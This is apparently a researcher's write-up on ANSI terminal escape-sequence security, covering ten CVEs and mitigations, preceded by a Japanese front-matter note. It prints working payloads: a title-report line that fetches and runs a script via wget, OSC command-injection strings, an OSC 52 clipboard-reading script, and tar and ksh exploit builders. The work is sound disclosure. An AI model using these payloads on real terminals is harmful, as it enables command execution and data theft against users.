---
title: "ANSI Terminal Security (Terminally Owned – 60 Years of Escaping)"
source_url: "https://dgl.cx/2023/09/ansi-terminal-security"
source_type: article
fetched: 2026-06-01
topic: safety
tags: ["escape-injection", "DECRQSS", "OSC", "echoback", "rce", "def-con-31", "leadbeater"]
summary: "David Leadbeater(DEF CON 31)による研究者本人の総覧記事。DECRQSSなどのエコーバック、OSC処理、文字セット変更を悪用した10+件のターミナルエミュレータCVEと、ESC(27)のエスケープ等の対策指針をまとめる。"
relevance: "端末出力に含まれる悪性エスケープが「読み返し→コマンド注入」へ至る経路を一次解説。我々の read 層が画面内容をそのまま信用してはならず、ESC含む制御文字を無害化すべき根拠を与える。"
chars: 53114
---

# [dgl.cx](/ "Home")

[projects](/projects)
[about](/about "About me and this site")

Ō£©
ŌśĆ’ĖÅ
Ōśü’ĖÅ

## ["[31m"?! ANSI Terminal security in 2023 and finding 10 CVEs](#_)

This paper reflects work done in late 2022 and 2023 to audit for
vulnerabilities in terminal emulators, with a focus on open source software.
The results of this work were 10 CVEs against terminal emulators that could
result in Remote Code Execution (RCE), in addition various other bugs and
hardening opportunities were found. The exact context and severity of these
vulnerabilities varied, but some form of code execution was found to be
possible on several common terminal emulators across the main client platforms
of today.

Additionally several new ways to exploit these kind of vulnerabilities were
found.

This is the full technical write-up that assumes some familiarity with the subject matter, for a
more gentle introduction see [my post on the G-Research
site](https://www.gresearch.com/blog/article/g-research-the-terminal-escapes/).

### [Terminal emulators](#terminal-emulators)

[![](/2023/09/vt100-defcon.jpg)](https://youtu.be/Y4A7KMQEmfo)

I will talk about terminal "emulators". When people talk about emulators in this
context, they don't mean emulation in terms of actually emulating the hardware
(as now common with game consoles), but software re-implementations of physical
terminal devices. In this case these are mostly terminals from Digital Equipment
Corporation (DEC) such as the VT100 and later compatible (and extended)
terminals in the VT (Video Terminal) range which have become a defacto standard.

There are many online resources about these terminals; I will go into some
necessary detail later, but if you are interested to read more background
[vt100.net](http://vt100.net) is a great resource.

### [Past work](#past-work)

*"Those who cannot remember the past are condemned to repeat it."*

In a [1994 issue of phrack](http://phrack.org/issues/46/4.html) there is
"flash.c" -- this floods a user's terminal with escape sequences, making it
flash. This is one of the first references I can find to using this to attack
users, however it was definitely known before then. The attack is interesting
as it uses the talk protocol (which through `talkd` could write to a user's
terminal at any time, to let them know another (potentially remote) user wished
to "talk" to them. This is now clearly a historical relic, but as I'll show
finding a way to write raw data to a user's terminal is the first step in the
modern versions of these attacks.

In 1999 the first hints of attacks against terminal emulators themselves were [revealed](https://seclists.org/bugtraq/1999/Sep/432). This was using the set title escape sequence to overflow
the buffer for the title itself in kvt (the KDE terminal emulator that predated Konsole). I had missed this,
credit to Sebastian Wain (the original finder), for [bringing
it to my attention](https://news.ycombinator.com/item?id=37961449).

Moving on to this century, in 2003 HD Moore released a paper: ["Terminal
Emulator Security Issues"](https://marc.info/?l=bugtraq&m=104612710031920&w=2). This is the first write-up I can find of the
potential issues with terminal security, that includes more than just DoS
attacks. It's worth mentioning this paper includes CVE candidates, e.g.
"CAN-2003-0063", as at the time CVEs were relatively new. This also means
tracking historical vulnerabilities before this point is harder.

In 2008 Paul Szabo found a vulnerability in xterm ([CVE-2008-2383](http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=510030)). This is one
of the first published examples I know of, of what I call a "full echoback"
vulnerability, where it's possible to insert control characters into the input stream.

More modern is [trojan source](https://trojansource.codes/) which similarly to
hidden escape sequences, uses Unicode control characters to hide some text; for
example by using Unicode's Right-to-Left Override (RTLO). This paper will only
cover Unicode as it relates to terminals, for more details on Unicode Source
Code Handling see [Unicode Technical Standard
#55](https://www.unicode.org/reports/tr55/).

## [Escape sequence overview](#escape-sequence-overview)

Escape sequences were originally defined in [ANSI X3.64](https://en.wikipedia.org/wiki/ANSI_escape_code), that is the ANSI standard
on "Additional Controls For Use With American National Standard Code for Information Interchange"
-- this builds on characters defined in the ASCII standard to provide control for display and
printer devices. Which is a wordy way to say this is all based on an old standard; not a bad thing,
it works, but it does mean there is a lot of things done in ways which wouldn't be the case in a
modern standard.

Escape sequences can be used for many control purposes, including changing
colors, moving around the screen and querying the state of the terminal.

Many end users use a terminal without needing to understand escape sequences,
but just like HTML, they are there and "view source" while not as obvious as a
context menu click is quite easy. The `cat` command has a `-v` flag which can
be used to perform escaping. This can be simply combined with Unix pipes to see
the raw output from some commands, for example `cmatrix | cat -v` will show the
output from [cmatrix](https://github.com/abishekvashok/cmatrix) -- a console,
screensaver-like implementation of the Matrix animation.

(Aside: `cat -v` was added in BSD Unix, to some annoyance of the Bell Labs Unix
team, see [cat -v considered harmful](https://harmful.cat-v.org/cat-v/) (1983).
Alternatives include `sed -u -e 'l'` and `vis` in BSDs.)

For commands which need interactivity the simple `cat -v` approach won't work,
many Unixes have a `script` command which can be used to save the full terminal
output to a file. The `script` command is sadly not standardised, some versions
support timestamps to allow replay of these saved files. (There is also
[asciinema](https://asciinema.org/) which can be used like `script` but
provides a more modern interface, including a browser based player.)

## [Classes of vulnerability](#classes-of-vulnerability)

In order to understand the risk from these particular vulnerabilities and how
they could be exploited I'll classify them into some classes.

### [Misuse of escape sequences](#misuse-of-escape-sequences)

This is where an attacker can get an escape sequence written to a user's
terminal and the terminal behaves as expected when that sequence is written to
it.

A simple example is `curl` -- it will in most cases simply write ASCII data to a
terminal (it has some detection for binary data, but does not filter all data,
and the test for binary data can be easily defeated, as it isn't intended to
serve a security purpose and simply looks for NULs).

This is a vulnerability when it would be reasonable for the user to expect
escaping to happen. The most simple way to reason about this is to consider the
backspace character, if raw ASCII is printed then even without terminal escapes
it is possible to disguise the output.

There are cases where this can be used to hide text, for example:

```
$ printf "echo evil #\b\b\b\b\b\bgood  \n" > evil.sh
$ cat evil.sh
echo good
$ sh evil.sh
evil
```

Additionally standard tools like `less` take backspaces into account, so in some
cases text can easily be hidden when viewed with less, as is the default for
`git diff` among other tools. (You can use less -U to see controls, but
unfortunately that also includes tabs so isn't generally usable on source code.
This can be improved, see [less issue
#335](https://github.com/gwsw/less/issues/335) which adds a `--proc-tab` option
to allow tabs to be processed, but not other control characters.

In code the safest way to print unknown text is to use the C `isprint()`
function, and only output printable characters. Note that is not usually what
is actually wanted, as often newlines at least will need to be included in the
output.

A good compromise is to only escape the terminal control characters (ESC,
character 27) This provides defence in depth for the security issues described
in this paper, but does not protect against confusion attacks.

An interesting area is terminals that accept C1 controls (8-bit, e.g. [U+009B](https://www.compart.com/en/unicode/U%2B009B)), many do not accept these controls,
particularly as how they interact with UTF-8 is un(der)specified. VTE based terminals, Kitty and
WezTerm are some of the few terminals that accept C1 controls by default, within UTF-8 encoded data.
My recommendation would be to not use these terminals with untrusted data.

As mentioned flash.c was published in Phrack in 1994. The entry point via
`talkd` is no longer relevant, but if we can deliver the escape sequences it
uses to a terminal, the result still possible, as this isn't a vulnerability,
it is simply expected VT behavior.

```
# This simulates the effect of receiving "flash", a 1994 terminal DoS attack.
while :; do
  printf "\033c\033(0\033#8"
  sleep 0.1
  printf "\033[1;3r\033[J"
  sleep 0.1
  printf "\033[5m\033[?5h"
  sleep 0.1
done
```

*If you need to look-up an escape sequence the [xterm ctlseq
reference](https://invisible-island.net/xterm/ctlseqs/ctlseqs.html) is quite
good and documents all the sequences xterm supports.*

To break that down:

* First line:
  + `ESC c`
    Full Reset (RIS)
  + `ESC ( 0`
    Designate G0 Character Set, where 0 means "DEC Special Character and Line Drawing Set" from the VT100
  + `ESC # 8`
    DEC Screen Alignment Test (DECALN), fully fills the screen with "E" characters
* Second line:
  + `ESC [1;3r` Set Scrolling Region (DECSTBM), limits the scrolling area to the top 3 lines of the screen.
  + `ESC [J` Erase in Display (ED), as the terminal has been reset the cursor is at the top left, so this erase below actually erases the whole display. Between this and the screen alignment test is what causes the flashing.
* Third line:
  + `ESC [5m` Select Graphic Rendition (SGR), 5 (blink). This doesn't actually do anything as it doesn't print any normal characters between this and the reset.
  + `ESC [?5h` Reverse Video (DECSCNM), this swaps the background and foreground.

As you can see there's lots of possibilities here, changing the character set is
particularly nasty as something like `hello world` will become  `ŌÉżŌÉŖŌöīŌöīŌÄ║ Ōö¼ŌÄ║ŌÄ╝ŌöīŌÉŹ`.

There are additional things such as using invisible attributes (SGR 8, supported
by some terminals), the same color for the foreground and background which can
be used to hide text from a victim, or at least annoy them.

Additionally modern terminals support escape sequences related to the
environment they run within, for example setting the title, getting the size of
the window and mouse reporting. As we'll see some of those can lead to trouble.

[CWE-150](https://cwe.mitre.org/data/definitions/150.html) contains some
further references to CVEs where incorrect or missing terminal escaping led to
bugs.

### [Queries and Echoback](#queries-and-echoback)

Escape sequences are used both for sending data to the terminal (e.g.
changing color, sending queries), as well as receiving data from the terminal
(e.g. special key presses, replies to queries).

Queries are particularly interesting, as they are one of the main ways a
terminal can be exploited. In particular some queries make it possible to query
for a state the attack may control; the first known write-up of this is in [HD
Moore's work in 2003](https://marc.info/?l=bugtraq&m=104612710031920&w=2).

HD Moore's example is:

```
echo -e "\e]2;;wget 127.0.0.1/.bd;sh .bd;exit;\a\e[21t\e]2;xterm\aPress Enter>\e[8m;"
```

This sets the title to a wget command and then runs the shell script
downloaded. It asks for the title to be reported, then sets the text to be
invisible.

Since then nearly all terminals disable title reporting by default (but some do
have an option to enable it). However I found several terminals in 2022 that
did enable it by default.

* WezTerm: Disabled in: <https://github.com/wez/wezterm/commit/e70f97903b8e5de8e918b9d9a1c68f80a1977425>

  This meant the unmodified command from 2003 worked against WezTerm. However
  WezTerm correctly implements the VT100 state machine, so this was only a
  "limited echoback" attack.
* SwiftTerm: Similar to WezTerm, disabled in: <https://github.com/migueldeicaza/SwiftTerm/commit/a94e6b24d24ce9680ad79884992e1dff8e150a31>
* ConEmu: Tracked in [CVE-2022-46387](https://nvd.nist.gov/vuln/detail/CVE-2022-46387) and [CVE-2023-39150](https://nvd.nist.gov/vuln/detail/CVE-2023-39150)

  The difference with the ConEmu variant of the title bug, is because it accepted
  control characters, it was possible to run commands without any user
  interaction. If an attacker could find a way to write to the terminal, they
  could almost certainly execute commands. Additionally the first fix did not
  fully fix the issue -- the author disabled certain control characters only (one
  control character that can bypass this is ^O which GNU readline uses as "accept
  and history next", which clink, as shipped with Cmder enables by default) --
  the fixed version fixes the no-user-interaction version but is still
  technically vulnerable to the 2003 attack version (the author for some reason
  doesn't seem to want to just remove the feature, I even offered a patch which
  disabled it).

![](yt-UXP3X2ofF8c.jpg)

ConEmu CVE-2023-39150 and DNS

Ō¢Č’ĖÅ

[[YouTube]](https://www.youtube.com/watch?v=UXP3X2ofF8c)

I am calling this class of attack as found against ConEmu a "full echoback",
i.e. the attacker can fully control the sequences that are echoed back
(including newlines and Control-C). Although not escape (except in iTerm2, which
supports two escape characters to escape escape in some contexts).

I am using the word "echoback" to describe cases where a terminal will respond
with some data that is sent to it.

It is also possible to use some built in terminal queries to make the terminal
write predictable text to the input stream. Usually these do not include a
newline character, so are limited and not controlled by the attacker. (An
exception is rxvt-unicode
[CVE-2021-33477](https://nvd.nist.gov/vuln/detail/CVE-2021-33477). However it
is possible to make the terminal reply with strings like "rgb:xxx/xxx/xxx",
which are somewhat attacker controllable; for example if an attacker can create
a file at a particular path they may be able to attack the user. This is
discussed later.

A further example of using escape sequences in unexpected ways can be found in
solid-snail's research. They disclosed two issues in iTerm2:
<https://blog.solidsnail.com/posts/2023-08-28-iterm2-rce> -- they had
independently discovered some of the ideas like using "rgb:.../" as a file path.

### [Buffer overflow in parsing](#buffer-overflow-in-parsing)

A terminal is dealing with parsing a lot of data and are commonly written in
memory unsafe languages, so it is not surprising to find buffer overflows.

One particular example is Sixel which is the DEC graphics format. It has had
various overflows in the past, for example in its implementation in xterm and in
libraries such as libsixel.

xterm [CVE-2022-24130](https://nvd.nist.gov/vuln/detail/CVE-2022-24130) was
found by Nick Black. This was a flaw in the repeat operator that is present in
the Sixel format and there was no bounds checking on the operator, for example:

```
printf '\ePq#1;1;1#1!99999999@\e\\\n'
```

Will crash xterm before the fix. I spent some time fuzzing xterm and found one
more Sixel issue, which is fixed in xterm 380 (along with several other bugs I
found).

### [Lack of escaping in processing](#lack-of-escaping-in-processing)

It is common for the strings sent via OSC to be further processed by terminals.
There have been several cases where this results in a terminal not escaping the
input sent to the terminal when it is further processed, e.g. running a
command.

#### [Windows Terminal + WSL](#windows-terminal--wsl-cve-2022-44702) [CVE-2022-44702](https://github.com/microsoft/terminal/releases/tag/v1.15.2874.0)

By using the ConEmu specific escape sequence OSC 9;9 to set a working directory
that contained a `"`, it was possible to run an arbitrary command when a WSL
tab was duplicated (ctrl+shift+d, or context menu item).

The exploit for this is to arrange for this string to be sent to the victim's terminal:

```
printf "\e]9;9;/\" sh -c 'calc.exe && cd && exec \$SHELL' -- \"o /\a"
```

Then when the victim duplicates the tab (assuming they've not configured the
shell working directory integration, which will undo the exploit) it will open
calculator.

This was [demonstrated in my BlueHat
talk](https://youtu.be/iIHw0KWgzAs?t=1104) (a version is embedded below, too).

#### [rxvt-unicode background OSC](#rxvt-unicode-background-osc-cve-2022-4170) [CVE-2022-4170](https://www.openwall.com/lists/oss-security/2022/12/05/1)

This was a fun one, the terminal supports a custom OSC for setting the
background, which it turned into its own special configuration language, which
was 'eval'ed as Perl code, while it tried to quote the input, it didn't do it
correctly.

Rather than write it again, I quote the
[advisory](https://www.openwall.com/lists/oss-security/2022/12/05/1) I sent to
oss-security below:

```
The "background" extension is automatically loaded if certain X
resources are set such as 'transparent' (see the full list at the top
of src/perl/background[1]). So it is possible to be using this
extension without realising it.

This is accidentally fixed on version 9.30, and I haven't confirmed
9.29, it appears to not be exploitable, but only due to another (not
security) bug. The actual bug which makes this not vulnerable on 9.30
is simply a wrong number in "on_osc_seq".

For 9.25 and 9.26 the patch at[2] can be backported. The body of the fix is:

 sub q0 {
-   (my $str = shift) =~ s/\x00//g; # make sure there really aren't
any embedded NULs
-   "q\x00$str\x00"
+   "qq\x00\Q$_[0]\E\x00"
 }

Isn't Perl quoting fun? Paranoid people may wish to remove the entire
"on_osc_seq" subroutine to avoid passing any potentially untrusted
input anywhere near eval (this feature is deprecated and the
maintainer did mention they are considering what to do longer term).

It doesn't make sense to withhold an exploit for this; the fix gives a
pretty good idea where to look and this isn't vulnerable in the latest
version.

$ urxvt -transparent

Inside that running terminal:

# Make tint be "\\", which means the ending \x00 is quoted under our control
$ printf '\e]705;\\\a'
# Make the second q0 end the quoted q-string and then be valid perl
under our control
$ printf '\e]20;,rootalign root),`touch /tmp/cve-2022-4170` #\a'
```

The Windows Terminal and rxvt-unicode examples are two I found, there have been other
vulnerablities, for example [Carter Sande](https://carter.sande.duodecima.technology/)
found [CVE-2022-41322](https://bugs.gentoo.org/868543) in Kitty, where the OSC to
generate desktop notifications could be abused in a similar way.

### [DoS](#dos)

There are many possibilities for Denial-of-Service. These are less interesting
as really they are an inconvenience, the user can recover fairly quickly in
most cases, although in some cases they may be persistent, which means the user
may clean up and hide other tracks of an attacker or similar.

#### [iTerm2 REP](#iterm2-rep)

This uses the ANSI repeat sequence, to repeat a character many times, which
resulted in the terminal running out of memory (and "beachballing").

Simple example:

```
perl -le'print "x\e[2000000000b"'
```

This was fixed in <https://github.com/gnachman/iTerm2/commit/438fe6000>

Pretty amusing, but not really an issue except to crash the terminal. This was
further covered by [ST├¢K in his
talk](https://www.youtube.com/watch?v=3T2Al3jdY38), where for example emojis
result in more memory usage in some cases. Some terminals are still vulnerable
to this or minor variants.

#### [Windows Terminal OSC8 (hyperlink)](#windows-terminal-osc8-hyperlink)

A long URL could result in a crash when the tooltip was displayed. The displayed
URL length is now limited.

#### [OpenBSD: Console DoS](#openbsd-console-dos)

This caused a kernel memory out-of-bounds write via overflows on parameters. It also affected NetBSD as the
code dated to around 1998. In some cases it could give limited memory write and may be exploitable on 32-bit, if a kernel
memory address info leak is found, otherwise it causes a kernel panic or reboot.

Fix: <https://ftp.openbsd.org/pub/OpenBSD/patches/7.2/common/021_wscons.patch.sig>

Some exploits for these are:

```
printf '\eP2$t99999999\e\\'
printf '\e[0;10r\e[20d\e[2000Bx'
printf '\e[0;2r\e[5f\e[2000M'
```

I also found a later issue where the escape sequence parameter parsing itself
could be overflowed, this was fixed in:
<https://ftp.openbsd.org/pub/OpenBSD/patches/7.3/common/014_wscons.patch.sig>
(this one was also assigned [CVE-2023-40216](https://nvd.nist.gov/vuln/detail/CVE-2023-40216)).

An exploit that crashes this looks something like:

```
perl -e'print "\e["; print ";" x 128 for 1 .. 2**24; print ";;;;31m\n"' > bigesc
cat bigesc
```

(Yes, that's ~2GiB of semicolons.)

#### [Setting icons](#setting-icons)

For example xterm can load icons from local filesystem in response to an OSC.
This led to a local xterm DoS being possible through XPM via [CVE-2022-46285](https://nvd.nist.gov/vuln/detail/cve-2022-46285):

```
printf "/* XPM */\n/*" > /tmp/f
printf "\e]I/tmp/f\a"
```

#### [CyberARK's research: DoS via fast title updates](#cyberarks-research-dos-via-fast-title-updates)

This was discovered by Evitar Gerzi, and covered in the [CyberARK blog
post](https://www.cyberark.com/resources/threat-research-blog/dont-trust-this-title-abusing-terminal-emulators-with-ansi-escape-characters). Essentially Windows API calls to update the title are quite expensive and fast updates could cause the whole
Windows UI to hang, meaning an attacker who could write lots of text to a terminal could DoS the whole desktop.

### [Leaks](#leaks)

There are some ways that terminals can leak data unexpectedly, and possibly in
a way that is invisible to the user.

#### [xterm OSC 52 (clipboard)](#xterm-osc-52-clipboard)

xterm implements OSC 52 for reading and writing the clipboard. The upstream
default is to enable this, luckily many distributions set this off by default
(Debian, Red Hat, OpenBSD). A privileged remote attacker can do this in the
background, i.e. watch a user's clipboard over SSH.

For example:

```
#!/bin/bash
# Clipboard read via OSC 52
# David Leadbeater, 2023 <https://dgl.cx/0bsd>
pid=${1:?$'\e'"[GUsage: $0 pid-of-shell"}

tty="/dev/$(ps -otty -p$pid | tail -1)"

kill -STOP $pid
trap "kill -CONT $pid" EXIT

printf "\e]52;sc;?\a" > $tty
read -d "$(printf "\a")" x < $tty
cut -d';' -f3 <<<"$x" | base64 -d
```

Running this script against a PID of a shell connected to the system using
xterm will report the terminal's clipboard contents.

Few other terminals support reading the clipboard. However some support
writing, this is less of a concern, but one potential attack is a remote
attacker who has compromised a remote system could put something different on a
user's clipboard unexpectedly (in most cases this will also work when the
terminal is in the background).

#### [Cursor checksum](#cursor-checksum)

It is possible to ask for the cursor checksum using DECRQCRA. By asking for a
single character on the screen at a time, that character will be revealed.
One potential attack here is reading what is displayed on the terminal before
a user SSHes to a remote system. It can be done in a similar way to the
clipboard reading script above.

Few terminals support this and those that do either prompt the user or have
it disabled. There is value in supporting it as it allows for automated
testing of terminal behaviour, but it should only be used for tests and not
enabled all the time.

#### [Apple Terminal DNS leaks](#apple-terminal-dns-leaks)

Apple Terminal supports OSC 7 for setting the working directory. The idea is
the terminal can track which directory the user has changed into and then when
creating a new tab it will automatically change to that directory.

The implementation is a `file://` URL and in order to work out if the URL is
local or not it appears to do a DNS lookup. This means by simply outputting something like:

```
printf "\e]7;file://some.thing.example.com/\a"
```

The terminal will do a DNS lookup on `some.thing.example.com` to check whether
that resolves to one of the machine's IP addresses. There are a few uses of
this, one as a canary put into logs to see if the user is reading logs in a way
that they aren't escaped or as a way to leak content from a more secure system
(without internet access) to the internet via DNS going through the user's
client device.

(This was discussed in my [DEF CON 31 talk](https://youtu.be/Y4A7KMQEmfo?t=1923)
too.)

## [Echoback vulnerabilities in detail](#echoback-vulnerabilities-in-detail)

### [xterm font (OSC 50 query)](#xterm-font-osc-50-query)

This is a limited echoback. I discovered an interesting interaction with Zsh
where ^G is bound by default to list-expand. This means a string like `$(ls)`
will run the command when ^G is pressed.

From my post to [oss-security](https://www.openwall.com/lists/oss-security/2022/11/10/1):

```
The issue is in the OSC 50 sequence, which is for setting and querying
the font. If a given font does not exist, it is not set, but a query
will return the name that was set. Control characters can't be
included, but the response string can be terminated with ^G. This
essentially gives us a primitive for echoing text back to the terminal
and ending it with ^G.

It so happens ^G is in Zsh when in vi line editing mode bound to
"list-expand". Which can run commands as part of the expansion leading
to command execution without pressing enter!

This does mean to exploit this vulnerability the user needs to be
using Zsh in vi line editing mode (usually via $EDITOR having "vi" in
it). While somewhat obscure this is not a totally unknown
configuration.

In that configuration, something like:
printf "\e]50;i\$(touch /tmp/hack-like-its-1999)\a\e]50;?\a" > cve-2022-45063
cat cve-2022-45063  # or another way to deliver this to the victim

Will touch that file. It will leave the line on the user's screen;
I'll leave it as an exercise for the reader to use the vi line editing
commands to hide the evidence.

Debian, Red Hat and others disable font ops by default.
[...]
Additionally upstream xterm does not disable them by default, so some
distributions include a vulnerable default configuration.
```

(Demo in [Everything Open Talk](https://youtu.be/4kfDBNzStbs?t=1529).)

This bug in xterm was assigned [CVE-2022-45063](https://www.openwall.com/lists/oss-security/2022/11/10/1), it was fixed in xterm patch #375.

#### [mintty variant (via OSC 50 query)](#mintty-osc50) I found an interesting variant of this in mintty, which also implements OSC 50, including the query capability, but it echoed back exactly what was sent -- a full echoback (i.e. any character could be injected, leading to potential code execution if an attacker can write unescaped output to the terminal). The details for DECRQSS below therefore also apply to this issue in mintty. This variant in mintty was assigned [CVE-2023-39726](https://nvd.nist.gov/vuln/detail/CVE-2023-39726), it was [fixed](https://github.com/mintty/mintty/commit/ac3f255b84cbb6dc2d62423f69519c1770efb8f1) in mintty version 3.6.5. [DECRQSS](#decrqss) This vulnerability was first reported in xterm in 2008, tracked as [CVE-2008-2383](https://nvd.nist.gov/vuln/detail/CVE-2008-2383). An interesting detail of this is we now have easy access to the DEC manuals and they confirm that there should be no reply to an invalid request. (But note that there was a mistake in the documentation, as the response code was backwards). I have confirmed on a real VT520 that it does not ever return any user controllable text for an unknown DECRQSS sequence. Which means this somehow is a difference that was introduced into the xterm control sequence documentation, which unfortunately multiple terminal emulators then faithfully reimplemented. The xterm documentation has now been fixed (in 2023). The issue is a terminal can echoback the data sent to it. In this case the severity varies in different terminals. [iTerm2](#iterm2) iTerm2 [CVE-2022-45872](https://nvd.nist.gov/vuln/detail/CVE-2022-45872) resulted in a near full echoback. The only condition that must be met is any control character has to be the last character in the escape sequence. But it is possible to send multiple escape sequences, and in some cases iTerm2 will appear to buffer the output until a final DECRQSS sequence is sent without any control characters. This was fixed in iTerm2 3.4.18. [mintty](#mintty) mintty [CVE-2022-47583](https://nvd.nist.gov/vuln/detail/CVE-2022-47583) resulted in a full echoback (i.e. any character could be injected, leading to potential code execution if an attacker can write unescaped output to the terminal). It was fixed in mintty 3.6.3 ([part of this commit](https://github.com/mintty/mintty/commit/cabe4b1c8f0595ad414d19546bb8f25942cc8f01)). See ["less" below](#less) for a demo using this bug to run an attacker controlled command when the user merely types "git log". [SwiftTerm](#swiftterm) [CVE-2022-23465](https://nvd.nist.gov/vuln/detail/CVE-2022-23465) was also a full echoback. [Kitty](#kitty)Kitty had a variant which allowed non-control characters to be echoed back (a limited echoback). This was not assigned a CVE. It was fixed in [this commit](https://github.com/kovidgoyal/kitty/commit/60a7a53ccdac88dc728ac4f9e9295d64990e868c).[libvterm](#libvterm) This did not receive a CVE, it only allowed echoing back around 3 characters. As this library is embedded into Vim and Neovim, there were possible ways it could be attacked via Vi mode. [Report on huntr.dev](https://huntr.dev/bounties/79291944-5c63-4955-88d2-21a6120d12fa/). [zutty](#zutty) I did not find this one, credit to [Carter Sande](https://carter.sande.duodecima.technology/) for finding [CVE-2022-41138](https://bugs.gentoo.org/868495). This one has some limits on the length of the string, but could be exploited in a similar way to the others, aside from very long strings. [Vulnerabilities using known replies](#vulnerabilities-using-known-replies) Even with the fixes above there are cases where a terminal will reply with a sequence like ESC "/Z" which can be used to output data. ESC "/Z" is a VT52 compatibility sequence that has the purpose of identifying the version of the terminal and is almost certainly not used anymore. Given a Unix shell will usually run a command based on the relative path if it contains a "/" it is possible to do something like attack a user who happens to cd into /tmp, or otherwise deliver a file. Here's an exploit for busybox tar: ``` #!/bin/sh # Busybox sh + tar, exploit, based on observation on oss-security: # https://www.openwall.com/lists/oss-security/2021/05/17/1 (see the "exercise # for the reader") # Note this doesn't use the "newline" embedding attack from rxvt, so the user # has to press enter, but we mess up their terminal and put a ";" in the # output, so if they type something other than ^C and/or press enter it works. # # David Leadbeater, 2022. tmp=$(mktemp -d) pushd $tmp # rxvt-unicode and xterm -ti 100 mkdir -p 2c echo "touch /tmp/owned-by-tar && printf '\\e[31;43m -- Oh! look in /tmp --\\e[m\n'" > 2c/"Z[?1" chmod +x 2c/"Z[?1" # xterm -ti 102 mkdir -p Z/ZcZ ln -s ../../2c/"Z[?1" Z/ZcZ/Zc # (Two terminals included just to demonstrate this does depend on the # terminal's behaviour, but it's possible to target several via an escape that # results in a response longer than busybox's sh's escape handling buffer.) # Remove the "\e30m" to stop black text and see what's happening. touch 2c/$(perl -e'print "\e[30m\e[c\e[?2l"; print "\eZ" x 14; printf "\e<\e[A\e[c"') dd if=/dev/urandom of=2c/filler bs=1M count=100 touch 2c/$(perl -e'print "\e[A"') # order matters, to hide things. (no "v" to avoid messing up our terminal if # run under busybox tar.) tar cfz /tmp/busybox-tar-exploit.tgz 2c/*30* 2c/Z*1 Z/ZcZ/Zc 2c/filler 2c/*A* popd rm -rf "$tmp" echo Now make the victim run: tar zxvf /tmp/busybox-tar-exploit.tgz ``` In this case the victim is somehow social engineered into simply extracting a tar archive under busybox tar, they will then find their terminal unresponsive and maybe hit enter, running the attacker controlled command line. (Pressing Control-C will abort the command, then the user has to know to blindly type `reset`.) This exploit works for two reasons: * Busybox tar outputs raw escape characters (mentioned on oss-security as above in 2021, I sent the exploit to busybox authors too); * Busybox sh only has a short buffer for escape sequences, which if overflowed just writes the rest of the characters to the command line Aside: some other tar implementations are vulnerable to similar, for example OpenBSD's tar did not escape characters in error messages, so a tar archive [constructed carefully with overly long filenames](https://gist.github.com/dgl/355840320535bf8ef8b70f2e0722bf65) can result in raw escape sequences written to the screen (I reported this to OpenBSD and it was [fixed](https://github.com/openbsd/src/commit/375ccafb2eb77de6cf240e33e9e28d4d2a85b8c1), released with [OpenBSD 7.4](https://www.openbsd.org/74.html) — "In pax(1), tar(1), and cpio(1) terminal output, escape non-printable characters in messages that may include file names, and truncate times to the correct maximum value"). Another tool found to be vulnerable was OpenBSD's ksh. It did not escape output in tab completion lists. I demonstrated an exploit for this in my DEF CON talk: ``` #!/bin/sh set -ex cd /tmp # A file, which has some escape sequences in its name # - OSC 4;1 (set color of red, ensures following reports consistently what we want...) # - OSC 4;1 (report color, gives us rgb:ffff/0000...., i.e. something with slashes) # - Report DECSET (just to get a semicolon) # - Make invisible # - Hide cursor (makes it less obvious what's happening, maybe seems more like a bug...) # - Make xterm report key presses (stops ^C) set +x touch "$(printf '\e]4;1;red\e\\\e]4;1;?\e\\\e[?$p\e[8m\e[?25l\e[>4;2m')" set -x # Make it work both if someone does cd /tmp/<tab>, or ls <tab> within /tmp ln -sf /tmp 4 mkdir -p rgb:ffff/0000 cat <<'EOF' > rgb:ffff/0000/000065535 printf '\n\e[;31m\e#3Well hello '$(uname -sr) printf '\n\e[;31m\e#4Well hello '$(uname -sr) echo EOF chmod +x rgb:ffff/0000/000065535 echo "Now, do something like cd /tmp/<tab>" ``` In many ways this exploit is much like the tar exploit above, however it contains an interesting escape sequence I'd like to draw attention to, it targets xterm and xterm has a way to turn control characters into escape sequences. This means a user cannot simply press Control-C to cancel the command, and may end up pressing keys, until they press the only key which works, which happens to be Enter, running the attacker controlled command line (if you are paranoid something like this has happened to you, the safest thing to do is likely close the terminal). OpenBSD fixed this in [7.4](https://www.openbsd.org/74.html) ("In ksh(1), consistently escape control characters when displaying file name completions, even when there are multiple matches"). [Mitigating echoback vulnerabilities](#mitigating-echoback-vulnerabilities) I mentioned at the start of this paper that terminals "emulate" VT100 or later devices. This is interesting because ANSI X3.64-1979 does not define what to do in error conditions. However because most terminal emulators have claimed to be compatible with VT100 they should reimplement the error conditions in a similar way -- this has been documented in <https://vt100.net/emu/dec_ansi_parser> To again draw a comparison with HTML, this is similar to how the HTML 5 specification defines how parsing should behave in the presence of invalid characters (see ["Warning" in 13.2.3](https://html.spec.whatwg.org/multipage/parsing.html#the-input-byte-stream)). HTML spec: ``` The decoder algorithms describe how to handle invalid input; for security reasons, it is imperative that those rules be followed precisely. Differences in how invalid byte sequences are handled can result in, amongst other problems, script injection vulnerabilities ("XSS"). ``` Therefore, if terminal authors are reading this, please try to be exactly compatible with VT100 parsing. For example, an OSC sequence (osc\_string) ignores control characters. (With one exception; do not implement C1 control characters, they conflict with UTF-8 and the world doesn't use them anymore. See [this oss-security post from 2015](https://www.openwall.com/lists/oss-security/2015/09/20/1) for more details.) If we reduce the chances of control characters being in escape sequences, particularly replies, then shells can correctly handle replies (although there will still be cases where a reply is partly read and so on returning to the shell only the end of it will be seen, but a single response should not provide enough for a successful attack). GNU readline has a "skip-csi-sequence" function, which is by default unbound. We can set it up like so: ``` bind '"\e[": skip-csi-sequence' ``` This provides some protection from unexpected input, however we also need to implement "skip-osc-sequence" and "skip-dcs-sequence". I have a patch for this. TODO. With Zsh ZLE we can actually implement this ourselves: ``` function skip-csi-sequence() { local key while read -sk key && (( $((#key)) < 0x40 || $((#key)) > 0x7E )); do # empty body done } function skip-osc-sequence() { local key while read -sk key && (( $((#key)) != 0x1B && $((#key)) != 0x07 )); do # empty body done if [[ $((#key)) = 27 ]]; then # ^[\ read -sk key fi } function skip-dcs-sequence() { local key while read -sk key && (( $((#key)) != 0x1B )); do # empty body done if [[ $((#key)) = 27 ]]; then # ^[\ read -sk key fi } zle -N skip-csi-sequence zle -N skip-osc-sequence zle -N skip-dcs-sequence bindkey '\e[' skip-csi-sequence bindkey '\e]' skip-osc-sequence bindkey '\eP' skip-dcs-sequence 